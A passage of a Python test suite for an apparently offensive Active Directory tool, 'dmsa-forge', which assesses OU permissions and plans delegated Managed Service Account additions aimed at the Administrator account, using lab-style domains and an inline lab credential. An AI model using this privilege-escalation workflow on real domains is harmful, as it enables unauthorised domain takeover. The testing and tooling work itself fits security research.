        self.assertEqual(cli.resolve_ipv4_address('224.0.0.1'), '224.0.0.1')

    def test_kerberos_guidance_uses_placeholder_for_unusable_auto_dc_ip(self):
        lines = cli.kerberos_guidance_lines(
            domain='eighteen.htb',
            username='adam.scott',
            password='iloveyou1',
            dmsa_name='redpen',
            dc_host='224.0.0.1',
        )
        joined = '\n'.join(lines)

        self.assertIn('Set --dc-ip to a specific DC IPv4', joined)
        self.assertIn('/dc:<DC_IPV4>', joined)
        self.assertNotIn('/dc:224.0.0.1', joined)

    def test_resolved_dc_ip_only_changes_kerberos_next_steps(self):
        options = execution_options(
            action='add',
            account='eighteen.htb/adam.scott:iloveyou1',
            dc_host='dc01.eighteen.htb',
            dc_host_supplied=True,
            dc_ip=None,
            resolved_dc_ip='10.129.23.216',
            dmsa_name='redpen',
            target_ou='OU=Staff,DC=eighteen,DC=htb',
        )
        report = {'result': {}}

        cli.attach_next_steps(report, options, mode='execute', success=True)

        commands = [step['command'] for step in report['result']['next_steps']]
        self.assertIn('--dc-host dc01.eighteen.htb', commands[0])
        self.assertNotIn('--dc-ip 10.129.23.216', commands[0])
        self.assertIn('/dc:10.129.23.216', '\n'.join(commands[2:]))

    def test_run_rejects_unusable_auto_resolved_dc_ip(self):
        class NoopLDAPCompat:
            def __init__(self, **kwargs):
                self.bound = True
                self.entries = []
                self.result = {'result': 0, 'description': 'success', 'message': ''}

            def search(self, **kwargs):
                self.entries = []
                self.result = {'result': 0, 'description': 'success', 'message': ''}
                return True

            def unbind(self):
                self.bound = False

        original_ldap = cli.LDAPCompat
        original_resolve = cli.resolve_ipv4_address
        try:
            cli.LDAPCompat = NoopLDAPCompat

            def fake_resolve(host, usable_only=False):
                return None if usable_only else '224.0.0.1'

            cli.resolve_ipv4_address = fake_resolve
            options = execution_options(
                action='assess',
                dc_host='dc01.eighteen.htb',
                dc_host_supplied=True,
                dc_ip=None,
                include_sd=False,
                search_summary=True,
                skip_dc_prereq=True,
            )
            forge = cli.DMSAForge('adam.scott', 'iloveyou1', 'eighteen.htb', '', '', options)
            with contextlib.redirect_stderr(io.StringIO()):
                success = forge.run()
        finally:
            cli.LDAPCompat = original_ldap
            cli.resolve_ipv4_address = original_resolve

        self.assertTrue(success)
        self.assertIsNone(getattr(options, 'resolved_dc_ip', None))
        self.assertIsNone(forge._target_ip)
        self.assertEqual(forge.report['connection']['dc_ip'], '(not set)')
        self.assertTrue(any(
            event['kind'] == 'dc_ip'
            and event['status'] == 'rejected'
            and event['detail'] == 'dc01.eighteen.htb resolved to unusable 224.0.0.1; continuing without inferred --dc-ip'
            for event in forge.report['inference']
        ))
        self.assertFalse(any(
            'proxy-DNS placeholder' in event['detail'] or 'Kerberos /dc guidance' in event['detail']
            for event in forge.report['inference']
        ))

    def test_failed_execution_has_no_next_steps(self):
        options = execution_options(action='assess')
        report = {'result': {'error_code': 'ou_search_failed'}}

        cli.attach_next_steps(report, options, mode='execute', success=False)

        self.assertEqual(report['result']['next_steps'], [])

    def test_empty_search_result_has_no_next_steps(self):
        options = execution_options(action='assess')
        report = {'result': {'mode': 'summary', 'ou_count': 0}}

        cli.attach_next_steps(report, options, mode='execute', success=True)

        self.assertEqual(report['result']['next_steps'], [])

    def test_empty_security_descriptor_analysis_has_no_next_steps(self):
        options = execution_options(action='assess', include_sd=True, resolve_names=True)
        report = {'result': {'mode': 'security_descriptor_analysis', 'ou_count': 1, 'identity_count': 0}}

        cli.attach_next_steps(report, options, mode='execute', success=True)

        self.assertEqual(report['result']['next_steps'], [])

    def test_search_next_steps_start_with_add_plan_for_discovered_candidate(self):
        options = execution_options(
            action='assess',
            account='test.local/admin:pw',
            dc_host='dc01.test.local',
            dc_host_supplied=True,
            include_sd=True,
            resolve_names=False,
        )
        report = {
            'result': {
                'mode': 'security_descriptor_analysis',
                'ou_count': 1,
                'identity_count': 1,
                '_next_step_candidates': [
                    {
                        'identity': 'S-1-5-21-1-2-3-1604',
                        'target_ou': 'OU=Staff,DC=test,DC=local',
                    }
                ],
            }
        }

        cli.attach_next_steps(report, options, mode='execute', success=True)

        command = report['result']['next_steps'][0]['command']
        self.assertEqual(report['result']['next_steps'][0]['label'], 'Review add plan for discovered principal')
        self.assertIn('dmsa-forge plan add test.local/admin:pw', command)
        self.assertIn('--dc-host dc01.test.local', command)
        self.assertIn('--target-ou OU=Staff,DC=test,DC=local', command)
        self.assertIn('--dmsa-name redpen', command)
        self.assertIn('--principals-allowed S-1-5-21-1-2-3-1604', command)
        self.assertIn('--target-account Administrator', command)
        self.assertNotIn('<TARGET_ACCOUNT_DN_OR_SAM>', command)
        self.assertNotIn('hint', report['result']['next_steps'][0])
        self.assertNotIn('_next_step_candidates', report['result'])

    def test_search_next_steps_keep_proxychains_for_add_plan(self):
        options = execution_options(
            action='assess',
            account='test.local/admin:pw',
            include_sd=True,
            next_step_prefix='proxychains -f chain1080.conf -q',
        )
        report = {
            'result': {
                'mode': 'security_descriptor_analysis',
                'ou_count': 1,
                'identity_count': 1,
                '_next_step_candidates': [
                    {
                        'identity': 'S-1-5-21-1-2-3-1604',
                        'target_ou': 'OU=Staff,DC=test,DC=local',
                    }
                ],
            }
        }

        cli.attach_next_steps(report, options, mode='execute', success=True)

        command = report['result']['next_steps'][0]['command']
        self.assertTrue(command.startswith('proxychains -f chain1080.conf -q dmsa-forge plan add'))
        self.assertIn('--dmsa-name redpen', command)

    def test_rejected_dc_ip_next_step_reruns_current_action_first(self):
        options = execution_options(
            action='assess',
            account='eighteen.htb/adam.scott:iloveyou1',
            dc_host='dc01.eighteen.htb',
            dc_host_supplied=True,
            include_sd=True,
            next_step_prefix='proxychains -f chain1080.conf -q',
        )
        report = {
            'inference': [
                {
                    'kind': 'dc_ip',
                    'status': 'rejected',
                    'detail': 'dc01.eighteen.htb resolved to unusable 224.0.0.1; continuing without inferred --dc-ip',
                }
            ],
            'result': {
                'mode': 'security_descriptor_analysis',
                'ou_count': 1,
                'identity_count': 1,
                '_next_step_candidates': [
                    {
                        'identity': 'S-1-5-21-1-2-3-1604',
                        'target_ou': 'OU=Staff,DC=eighteen,DC=htb',
                    }
                ],
            }
        }

        cli.attach_next_steps(report, options, mode='execute', success=True)

        steps = report['result']['next_steps']
        self.assertEqual(len(steps), 1)
        self.assertEqual(steps[0]['label'], 'Rerun with a real DC IPv4')
        self.assertIn(
            'proxychains -f chain1080.conf -q dmsa-forge assess eighteen.htb/adam.scott:iloveyou1',
            steps[0]['command'],
        )
        self.assertIn('--dc-host dc01.eighteen.htb', steps[0]['command'])
        self.assertIn('--dc-ip REAL_DC_IPV4', steps[0]['command'])
        self.assertNotIn('plan add', steps[0]['command'])
        self.assertNotIn('_next_step_candidates', report['result'])

    def test_report_parsed_inputs_are_flat(self):
        result = run_cli('add', *BASE_ARGS, '--dry-run', '--output-only')

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        payload = json.loads(result.stdout)
        self.assertIn('base_dn_valid', payload['parsed_inputs'])
        self.assertNotIn('parsed_inputs', payload['parsed_inputs'])

    def test_dmsa_name_trailing_dollar_is_normalized_in_reports(self):
        self.assertEqual(cli.normalized_dmsa_name(' redpen $ '), 'redpen')

        result = run_cli(
            'add',
            *BASE_ARGS,
            '--dmsa-name',
            'redpen$',
            '--dry-run',
            '--output-only',
        )

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        payload = json.loads(result.stdout)
        self.assertEqual(payload['inputs']['dmsa_name'], 'redpen')
        self.assertEqual(payload['inputs']['dns_hostname'], 'redpen.test.local')
        self.assertTrue(payload['inputs']['planned_dmsa_dn'].startswith('CN=redpen,'))
        self.assertNotIn('redpen$', result.stdout)

    def test_safe_profile_sets_dry_run_and_scope_from_account_domain(self):
        result = run_cli(
            'add',
            'test.local/admin:pw',
            '--target-ou',
            'OU=Staff,DC=test,DC=local',
            '--target-account',
            'Administrator',
            '--profile',
            'safe',
            '--output-only',
        )

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        payload = json.loads(result.stdout)
        self.assertEqual(payload['controls']['profile'], 'safe')
        self.assertTrue(payload['controls']['dry_run'])
        self.assertEqual(payload['scope']['domain'], 'test.local')
        self.assertEqual(payload['scope']['base_dn'], 'DC=test,DC=local')

    def test_account_domain_infers_scope_base_method_port_and_dns(self):
        result = run_cli(
            'add',
            'test.local/admin:pw',
            '--target-ou',
            'OU=Staff,DC=test,DC=local',
            '--target-account',
            'CN=Administrator,CN=Users,DC=test,DC=local',
            '--dmsa-name',
            'redpen',
            '--dry-run',
            '--output-only',
        )

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        payload = json.loads(result.stdout)
        self.assertNotIn('config', payload)
        self.assertEqual(payload['connection']['method'], 'LDAP')
        self.assertEqual(payload['connection']['port'], 389)
        self.assertEqual(payload['connection']['base_dn'], 'DC=test,DC=local')
        self.assertEqual(payload['scope']['domain'], 'test.local')
        self.assertEqual(payload['scope']['base_dn'], 'DC=test,DC=local')
        self.assertEqual(payload['inputs']['dns_hostname'], 'redpen.test.local')
        kinds = [event['kind'] for event in payload['inference']]
        self.assertIn('connection', kinds)
        self.assertIn('dns_hostname', kinds)

    def test_target_ou_infers_scope_when_account_domain_is_short(self):
        result = run_cli(
            'add',
            'TEST/admin:pw',
            '--target-ou',
            'OU=Staff,DC=test,DC=local',
            '--target-account',
            'CN=Administrator,CN=Users,DC=test,DC=local',
            '--dmsa-name',
            'redpen',
            '--dry-run',
            '--output-only',
        )

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        payload = json.loads(result.stdout)
        self.assertEqual(payload['connection']['base_dn'], 'DC=test,DC=local')
        self.assertEqual(payload['scope']['domain'], 'test.local')
        self.assertEqual(payload['scope']['base_dn'], 'DC=test,DC=local')
        self.assertEqual(payload['inputs']['dns_hostname'], 'redpen.test.local')

    def test_explicit_port_infers_method_when_method_is_omitted(self):
        result = run_cli(
            'add',
            'test.local/admin:pw',
            '--port',
            '636',
            '--target-ou',
            'OU=Staff,DC=test,DC=local',
            '--target-account',
            'CN=Administrator,CN=Users,DC=test,DC=local',
            '--dmsa-name',
            'redpen',
            '--dry-run',
            '--output-only',
        )

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        payload = json.loads(result.stdout)
        self.assertEqual(payload['connection']['method'], 'LDAPS')
        self.assertEqual(payload['connection']['port'], 636)
        self.assertTrue(any(event['kind'] == 'method' and event['status'] == 'inferred' for event in payload['inference']))

    def test_scope_base_dn_infers_base_dn_for_short_account_domain(self):
        result = run_cli(
            'assess',
            'TEST/admin:pw',
            '--scope-base-dn',
            'DC=test,DC=local',
            '--dry-run',
            '--output-only',
        )

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        payload = json.loads(result.stdout)
        self.assertEqual(payload['connection']['base_dn'], 'DC=test,DC=local')
        self.assertEqual(payload['scope']['base_dn'], 'DC=test,DC=local')
        self.assertTrue(any(event['kind'] == 'base_dn' and event['detail'] == 'from --scope-base-dn' for event in payload['inference']))

    def test_verify_plan_uses_base_lookup_for_principals_allowed_dn(self):
        principal_dn = 'CN=Readers,CN=Users,DC=test,DC=local'
        result = run_cli(
            'verify',
            'test.local/admin:pw',
            '--target-ou',
            'OU=Staff,DC=test,DC=local',
            '--dmsa-name',
            'redpen',
            '--principals-allowed',
            principal_dn,
            '--scope-domain',
            'test.local',
            '--scope-base-dn',
            'DC=test,DC=local',
            '--dry-run',
            '--output-only',
        )

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        payload = json.loads(result.stdout)
        principal_ops = [
            op for op in payload['ldap_operations']
            if op.get('purpose') == 'principals-allowed DN validation'
        ]
        self.assertEqual(len(principal_ops), 1)
        self.assertEqual(principal_ops[0]['base'], 'CN=Readers,CN=Users,DC=test,DC=local')
        self.assertEqual(principal_ops[0]['scope'], cli.LDAP_BASE)

    def test_root_dse_base_dn_reconcile_updates_scope_report(self):
        class RootDSEConnection:
            def __init__(self):
                self.entries = []
                self.result = {'result': 0, 'description': 'success', 'message': ''}

            def search(self, search_base=None, **kwargs):
                if search_base == '':
                    self.entries = [cli._LDAPEntry(
                        '',
                        {'defaultNamingContext': ['DC=test,DC=local']},
                    )]
                    return True
                self.entries = []
                return True

        options = execution_options(
            account='TEST/admin:pw',
            base_dn='DC=TEST',
            scope_domain=None,
            scope_base_dn=None,
            base_dn_supplied=False,
            scope_domain_supplied=False,
            scope_base_dn_supplied=False,
        )
        forge = cli.DMSAForge('admin', 'pw', 'TEST', '', '', options)
        forge._reconcile_root_dse_base_dn(RootDSEConnection(), 'TEST', None)

        self.assertEqual(forge._base_dn, 'DC=test,DC=local')
        self.assertEqual(forge._scope_base_dn, 'DC=test,DC=local')
        self.assertEqual(forge._scope_domain, 'test.local')
        self.assertEqual(forge.report['connection']['base_dn'], 'DC=test,DC=local')
        self.assertEqual(forge.report['scope']['base_dn'], 'DC=test,DC=local')
        self.assertEqual(forge.report['scope']['domain'], 'test.local')

    def test_connection_fallback_tries_ldaps_when_default_ldap_fails(self):
        attempts = []

        class FlakyLDAPCompat:
            def __init__(self, **kwargs):
                attempts.append((kwargs['use_ldaps'], kwargs['port']))
                if not kwargs['use_ldaps']:
                    raise Exception('connection refused')
                self.bound = True
                self.entries = []
                self.result = {'result': 0, 'description': 'success', 'message': ''}

            def search(self, **kwargs):
                self.entries = []
                self.result = {'result': 0, 'description': 'success', 'message': ''}
                return True

            def unbind(self):
                self.bound = False

        original = cli.LDAPCompat
        try:
            cli.LDAPCompat = FlakyLDAPCompat
            options = execution_options(method='LDAP', port=None, method_supplied=False, port_supplied=False)
            forge = cli.DMSAForge('admin', 'pw', 'test.local', '', '', options)
            with contextlib.redirect_stderr(io.StringIO()):
                success = forge.run()
        finally:
            cli.LDAPCompat = original

        self.assertTrue(success)
        self.assertEqual(attempts, [(False, 389), (True, 636)])
        self.assertEqual(forge.report['connection']['method'], 'LDAPS')
        self.assertEqual(forge.report['connection']['port'], 636)
        self.assertTrue(any(event['kind'] == 'connection' and event['status'] == 'selected' for event in forge.report['inference']))

    def test_target_account_uses_exact_dn_candidate_after_search_miss(self):
        class CandidateConnection:
            def __init__(self):
                self.entries = []
                self.result = {'result': 0, 'description': 'success', 'message': ''}
                self.calls = []

            def search(self, search_base=None, **kwargs):
                self.calls.append(search_base)
                if search_base == 'CN=Administrator,CN=Users,DC=test,DC=local':
                    self.entries = [cli._LDAPEntry(
                        'CN=Administrator,CN=Users,DC=test,DC=local',
                        {
                            'objectClass': ['top', 'person', 'user'],
                            'sAMAccountName': ['Administrator'],
                            'cn': ['Administrator'],
                            'name': ['Administrator'],
                        },
                    )]
                    self.result = {'result': 0, 'description': 'success', 'message': ''}
                    return True
                self.entries = []
                self.result = {'result': 0, 'description': 'success', 'message': ''}
                return True

        forge = minimal_forge()
        resolved = forge.resolve_account_dn(CandidateConnection(), 'Administrator')

        self.assertEqual(resolved, 'CN=Administrator,CN=Users,DC=test,DC=local')
        self.assertTrue(any(event['kind'] == 'target_account' and event['status'] == 'selected' for event in forge.report['inference']))

    def test_target_account_candidate_inference_uses_full_dns(self):
        class MissingCandidateConnection:
            def __init__(self):
                self.entries = []
                self.result = {'result': 0, 'description': 'success', 'message': ''}

            def search(self, **kwargs):
                self.entries = []
                self.result = {'result': 0, 'description': 'success', 'message': ''}
                return True

        forge = minimal_forge()
        resolved = forge.resolve_account_dn(MissingCandidateConnection(), 'redpen')

        self.assertIsNone(resolved)
        details = [
            event['detail'] for event in forge.report['inference']
            if event['kind'] == 'target_account' and event['status'] == 'try'
        ]
        self.assertIn('checking exact DN candidate CN=redpen,CN=Users,DC=test,DC=local', details)
        self.assertIn('checking exact DN candidate CN=redpen,CN=Computers,DC=test,DC=local', details)
        self.assertFalse(any('...' in detail for detail in details))

    def test_target_account_hint_explains_dmsa_name_mixup(self):
        forge = minimal_forge()

        self.assertIn(
            'use --dmsa-name redpen',
            forge._target_account_usage_hint('redpen'),
        )
        forge._dmsa_name_supplied = True
        self.assertEqual(forge._target_account_usage_hint('redpen'), '')

    def test_principals_allowed_resolution_fails_closed_on_ambiguous_name(self):
        class AmbiguousPrincipalConnection:
            def __init__(self):
                self.entries = []
                self.result = {'result': 0, 'description': 'success', 'message': ''}

            def search(self, **kwargs):
                self.entries = [
                    cli._LDAPEntry(
                        'CN=Reader One,CN=Users,DC=test,DC=local',
                        {
                            'objectClass': ['top', 'person', 'user'],
                            'objectSid': ['S-1-5-21-1-2-3-1101'],
                            'sAMAccountName': ['reader'],
                            'cn': ['reader'],
                            'name': ['reader'],
                        },
                    ),
                    cli._LDAPEntry(
                        'CN=Reader Two,CN=Users,DC=test,DC=local',
                        {
                            'objectClass': ['top', 'group'],
                            'objectSid': ['S-1-5-21-1-2-3-2101'],
                            'sAMAccountName': ['reader'],
                            'cn': ['reader'],
                            'name': ['reader'],
                        },
                    ),
                ]
                return True

        forge = minimal_forge()
        resolved = forge.resolve_principal_sid(AmbiguousPrincipalConnection(), 'reader')

        self.assertIsNone(resolved)
        self.assertIn('multiple exact sAMAccountName matches', forge._last_principal_error)

    def test_principals_allowed_resolution_accepts_single_group(self):
        class SinglePrincipalConnection:
            def __init__(self):
                self.entries = []
                self.result = {'result': 0, 'description': 'success', 'message': ''}

            def search(self, **kwargs):
                self.entries = [
                    cli._LDAPEntry(
                        'CN=Readers,CN=Users,DC=test,DC=local',
                        {
                            'objectClass': ['top', 'group'],
                            'objectSid': ['S-1-5-21-1-2-3-2101'],
                            'sAMAccountName': ['Readers'],
                            'cn': ['Readers'],
                            'name': ['Readers'],
                        },
                    )
                ]
                return True

        forge = minimal_forge()
        resolved = forge.resolve_principal_sid(SinglePrincipalConnection(), 'Readers')

        self.assertEqual(resolved, 'S-1-5-21-1-2-3-2101')

    def test_principals_allowed_dn_uses_base_lookup_only(self):
        class DNPrincipalConnection:
            def __init__(self):
                self.entries = []
                self.result = {'result': 32, 'description': 'error', 'message': 'noSuchObject'}
                self.calls = []

            def search(self, search_base=None, search_scope=None, **kwargs):
                self.calls.append((search_base, search_scope))
                self.entries = []
                return False

        connection = DNPrincipalConnection()
        forge = minimal_forge()
        resolved = forge.resolve_principal_sid(connection, 'CN=Readers,CN=Users,DC=test,DC=local')

        self.assertIsNone(resolved)
        self.assertEqual(connection.calls, [('CN=Readers,CN=Users,DC=test,DC=local', cli.LDAP_BASE)])

    def test_excluded_domain_admin_sid_requires_domain_boundary(self):
        forge = minimal_forge()

        self.assertTrue(forge.is_excluded_sid('S-1-5-21-1-2-3-512', 'S-1-5-21-1-2-3'))
        self.assertFalse(forge.is_excluded_sid('S-1-5-21-1-2-30-512', 'S-1-5-21-1-2-3'))

    def test_doctor_outputs_local_json_report(self):
        result = run_cli('doctor', '--output-only')

        self.assertIn(result.returncode, (0, 1), msg=result.stderr)
        payload = json.loads(result.stdout)
        self.assertEqual(payload['action'], 'doctor')
        self.assertEqual(payload['mode'], 'doctor')
        self.assertEqual(payload['ldap_operations'], [])
        self.assertEqual(payload['inputs']['account'], '(not set)')
        self.assertIn(payload['result']['readiness'], ('ready', 'warning', 'blocked'))
        self.assertIn('recommendations', payload['result'])
        check_names = {check['name'] for check in payload['result']['checks']}
        self.assertNotIn('account domain hint', check_names)
        self.assertNotIn('base DN', check_names)
        self.assertNotIn('scope domain', check_names)
        self.assertNotIn('scope base DN', check_names)

    def test_doctor_accepts_workflow_hints_for_dn_checks(self):
        result = run_cli(
            'doctor',
            'test.local/admin',
            '--scope-domain',
            'test.local',
            '--target-ou',
            'OU=Staff,DC=test,DC=local',
            '--target-account',
            'CN=Administrator,CN=Users,DC=test,DC=local',
            '--principals-allowed',
            'CN=Readers,CN=Users,DC=test,DC=local',
            '--output-only',
        )

        self.assertIn(result.returncode, (0, 1), msg=result.stderr)
        payload = json.loads(result.stdout)
        checks = {check['name']: check for check in payload['result']['checks']}
        self.assertEqual(checks['target OU']['status'], 'ok')
        self.assertEqual(checks['target account DN']['status'], 'ok')
        self.assertEqual(checks['principals-allowed DN']['status'], 'ok')

    def test_doctor_text_output_is_concise_and_issue_only(self):
        result = run_cli('doctor', 'test.local/admin:pw', '--scope-domain', 'test.local', '--no-banner')

        self.assertIn(result.returncode, (0, 1), msg=result.stderr)
        self.assertIn('doctor: readiness=', result.stdout)
        self.assertNotIn('\n  fix:', result.stdout)
        self.assertNotIn('[OK]', result.stdout)
        self.assertNotIn('target OU', result.stdout)

    def test_doctor_reports_invalid_principals_allowed_sid(self):
        result = run_cli(
            'doctor',
            'test.local/admin',
            '--scope-domain',
            'test.local',
            '--principals-allowed',
            'S-1-bad',
            '--output-only',
        )

        self.assertEqual(result.returncode, 1)
        payload = json.loads(result.stdout)
        checks = {check['name']: check for check in payload['result']['checks']}
        self.assertEqual(checks['principals-allowed SID']['status'], 'error')

    def test_doctor_reports_bad_scope_domain_as_json(self):
        result = run_cli('doctor', 'test.local/admin', '--scope-domain', 'bad', '--output-only')

        self.assertEqual(result.returncode, 1)
        payload = json.loads(result.stdout)
        checks = {check['name']: check for check in payload['result']['checks']}
        self.assertEqual(payload['result']['readiness'], 'blocked')
        self.assertEqual(checks['scope domain']['status'], 'error')

    def test_doctor_kerberos_requires_krb5ccname_when_requested(self):
        result = run_cli(
            'doctor',
            'test.local/admin',
            '--kerberos',
            '--dc-host',
            'dc01.test.local',
            '--output-only',
            env_overrides={'KRB5CCNAME': None},
        )

        self.assertEqual(result.returncode, 1)
        payload = json.loads(result.stdout)
        checks = {check['name']: check for check in payload['result']['checks']}
        self.assertTrue(payload['controls']['kerberos'])
        self.assertEqual(checks['KRB5CCNAME']['status'], 'error')
        self.assertIn('Export KRB5CCNAME', checks['KRB5CCNAME']['remediation'])

    def test_doctor_kerberos_reports_missing_dc_host(self):
        result = run_cli(
            'doctor',
            'test.local/admin',
            '--kerberos',
            '--output-only',
            env_overrides={'KRB5CCNAME': None},
        )

        self.assertEqual(result.returncode, 1)
        payload = json.loads(result.stdout)
        checks = {check['name']: check for check in payload['result']['checks']}
        self.assertEqual(checks['Kerberos DC hostname']['status'], 'error')
        self.assertIn('--dc-host', checks['Kerberos DC hostname']['detail'])
        self.assertIn('--dc-host', checks['Kerberos DC hostname']['remediation'])

    def test_doctor_keeps_inline_account_without_hygiene_warning(self):
        result = run_cli('doctor', 'test.local/admin:SuperSecret!', '--output-only')

        self.assertIn(result.returncode, (0, 1), msg=result.stderr)
        payload = json.loads(result.stdout)
        checks = {check['name']: check for check in payload['result']['checks']}
        self.assertNotIn('credential hygiene', checks)
        self.assertEqual(payload['inputs']['account'], 'test.local/admin:SuperSecret!')

    def test_doctor_kerberos_reports_file_cache_path(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            cache_path = os.path.join(tmpdir, 'krb5cc_test')
            with open(cache_path, 'w') as handle:
                handle.write('not a real ccache')
            result = run_cli(
                'doctor',
                'test.local/admin',
                '--kerberos',
                '--dc-host',
                'dc01.test.local',
                '--output-only',
                env_overrides={'KRB5CCNAME': 'FILE:%s' % cache_path},
            )

        self.assertEqual(result.returncode, 1)
        payload = json.loads(result.stdout)
        checks = {check['name']: check for check in payload['result']['checks']}
        self.assertEqual(checks['KRB5CCNAME']['status'], 'ok')
        self.assertEqual(checks['ccache backend']['status'], 'ok')
        self.assertEqual(checks['ccache file exists']['status'], 'ok')
        self.assertEqual(checks['KRB5CCNAME']['detail'], 'FILE:%s' % cache_path)

    def test_ccache_locator_and_realm_helpers(self):
        file_locator = cli.parse_ccache_locator('FILE:/tmp/krb5cc_test')
        dir_locator = cli.parse_ccache_locator('DIR:/tmp/krb5ccdir')
        kcm_locator = cli.parse_ccache_locator('KCM:1000')
        plain_locator = cli.parse_ccache_locator('/tmp/plain_cache')

        self.assertTrue(file_locator['impacket_file_cache'])
        self.assertEqual(dir_locator['scheme'], 'DIR')
        self.assertFalse(kcm_locator['filesystem'])
        self.assertEqual(plain_locator['scheme'], 'FILE')
        self.assertEqual(cli.realm_from_principal_text('user@TEST.LOCAL'), 'TEST.LOCAL')

    def test_output_only_with_output_writes_json_without_stdout(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            output_path = os.path.join(tmpdir, 'report.json')
            result = run_cli('add', *BASE_ARGS, '--dry-run', '--output-only', '--output', output_path)

            self.assertEqual(result.returncode, 0, msg=result.stderr)
            self.assertEqual(result.stdout, '')
            with open(output_path, 'r') as handle:
                payload = json.load(handle)
            self.assertEqual(payload['action'], 'add')
            self.assertTrue(payload['controls']['output_only'])
            self.assertEqual(os.stat(output_path).st_mode & 0o777, 0o600)

    def test_kerberos_guidance_is_add_verify_option_not_action(self):
        add_help = run_cli('add', '-h')
        verify_help = run_cli('verify', '-h')
        verify_dry_run = run_cli(
            'verify',
            'test.local/admin:pw',
            '--target-ou',
            'OU=Staff,DC=test,DC=local',
            '--dmsa-name',
            'redpen',
            '--kerberos-guidance',
            '--dry-run',
            '--output-only',
        )
        guidance = run_cli('guidance', 'test.local/admin:pw', '--dmsa-name', 'redpen', '--json')

        self.assertEqual(add_help.returncode, 0, msg=add_help.stderr)
        self.assertEqual(verify_help.returncode, 0, msg=verify_help.stderr)
        self.assertNotIn('--kerberos-guidance', add_help.stdout)
        self.assertNotIn('--kerberos-guidance', verify_help.stdout)
        self.assertEqual(verify_dry_run.returncode, 0, msg=verify_dry_run.stderr)
        self.assertEqual(guidance.returncode, 2)
        self.assertIn('successful add/verify output includes Kerberos commands', guidance.stderr)

    def test_modify_is_fully_removed(self):
        direct = run_cli('modify', *BASE_ARGS, '--dmsa-name', 'redpen', '--dry-run', '--output-only')
        legacy = run_cli('test.local/admin:pw', '--action', 'modify')

        self.assertEqual(direct.returncode, 2)
        self.assertEqual(legacy.returncode, 2)
        self.assertIn('use delete/add/verify', direct.stderr)
        self.assertIn('--action was removed', legacy.stderr)
        self.assertNotIn('--allow-deprecated-modify', direct.stderr)

    def test_minimal_add_dry_run_does_not_trigger_search_only_prereq_error(self):
        result = run_cli('add', *BASE_ARGS, '--dry-run', '--output-only', '--minimal')

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        payload = json.loads(result.stdout)
        self.assertTrue(payload['controls']['minimal'])
        self.assertFalse(payload['controls']['skip_dc_prereq'])

    def test_minimal_search_plan_omits_skipped_dc_prereq_query(self):
        result = run_cli(
            'assess',
            'test.local/admin:pw',
            '--scope-domain',
            'test.local',
            '--minimal',
            '--dry-run',
            '--output-only',
        )

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        payload = json.loads(result.stdout)
        filters = [op.get('filter') for op in payload['ldap_operations']]
        self.assertTrue(payload['controls']['minimal'])
        self.assertTrue(payload['controls']['skip_dc_prereq'])
        self.assertNotIn('domain controllers', filters)
        self.assertIn('(objectClass=organizationalUnit)', filters)

    def test_search_accepts_target_ou_as_search_base(self):
        result = run_cli(
            'assess',
            'test.local/admin:pw',
            '--scope-domain',
            'test.local',
            '--target-ou',
            'OU=Staff,DC=test,DC=local',
            '--dry-run',
            '--output-only',
        )

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        payload = json.loads(result.stdout)
        ou_searches = [
            op for op in payload['ldap_operations']
            if op.get('filter') == '(objectClass=organizationalUnit)'
        ]
        self.assertEqual(len(ou_searches), 1)
        self.assertEqual(ou_searches[0]['base'], 'OU=Staff,DC=test,DC=local')

    def test_search_defaults_to_security_descriptor_analysis(self):
        result = run_cli(
            'assess',
            'test.local/admin:pw',
            '--scope-domain',
            'test.local',
            '--dry-run',
            '--output-only',
        )

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        payload = json.loads(result.stdout)
        ou_searches = [
            op for op in payload['ldap_operations']
            if op.get('filter') == '(objectClass=organizationalUnit)'
        ]
        self.assertTrue(payload['controls']['include_sd'])
        self.assertEqual(ou_searches[0]['controls'], ['sdflags=0x5'])
        self.assertIn('nTSecurityDescriptor', ou_searches[0]['attributes'])

    def test_assess_defaults_to_security_descriptor_analysis(self):
        result = run_cli(
            'assess',
            'test.local/admin:pw',
            '--scope-domain',
            'test.local',
            '--dry-run',
            '--output-only',
        )

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        payload = json.loads(result.stdout)
        self.assertEqual(payload['action'], 'assess')
        self.assertTrue(payload['controls']['include_sd'])
        ou_searches = [
            op for op in payload['ldap_operations']
            if op.get('filter') == '(objectClass=organizationalUnit)'
        ]
        self.assertEqual(ou_searches[0]['controls'], ['sdflags=0x5'])

    def test_search_summary_disables_security_descriptor_analysis(self):
        result = run_cli(
            'assess',
            'test.local/admin:pw',
            '--scope-domain',
            'test.local',
            '--summary',
            '--dry-run',
            '--output-only',
        )

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        payload = json.loads(result.stdout)
        ou_searches = [
            op for op in payload['ldap_operations']
            if op.get('filter') == '(objectClass=organizationalUnit)'
        ]
        self.assertFalse(payload['controls']['include_sd'])
        self.assertEqual(ou_searches[0].get('controls'), [])
        self.assertNotIn('nTSecurityDescriptor', ou_searches[0]['attributes'])

    def test_include_security_descriptor_short_alias_is_removed(self):
        long_result = run_cli(
            'assess',
            'test.local/admin:pw',
            '--scope-domain',
            'test.local',
            '--include-security-descriptor',
            '--resolve-names',
            '--dry-run',
            '--output-only',
        )
        short_result = run_cli(
            'assess',
            'test.local/admin:pw',
            '--scope-domain',
            'test.local',
            '--include-sd',
            '--resolve-names',
            '--dry-run',
            '--output-only',
        )

        self.assertEqual(long_result.returncode, 0, msg=long_result.stderr)
        self.assertEqual(short_result.returncode, 2)
        long_payload = json.loads(long_result.stdout)
        self.assertTrue(long_payload['controls']['include_sd'])
        self.assertIn('unrecognized arguments: --include-sd', short_result.stderr)

    def test_search_continues_when_dc_prereq_check_fails(self):
        class SearchConnection:
            def __init__(self):
                self.bound = True
                self.entries = []
                self.result = {'result': 0, 'description': 'success', 'message': ''}
                self.calls = []

